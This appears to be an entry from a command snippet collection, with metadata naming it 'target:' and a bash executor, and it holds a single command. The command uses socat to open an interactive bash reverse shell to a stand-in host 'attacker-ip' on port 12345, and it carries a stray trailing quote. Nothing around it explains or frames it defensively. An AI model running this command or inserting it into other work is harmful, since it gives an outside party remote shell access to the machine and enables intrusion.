---
id: 846047cd-63b9-4a4d-9ac2-a3dcbe6d38c4
name: 'target:'
type: command
executor: bash
data: 'socat exec:''bash -li'',pty,stderr,setsid,sigint,sane tcp:attacker-ip:12345"

  '
output: null
created_at: '2020-07-14T18:14:36.929414+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# target:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker-ip:12345"

```
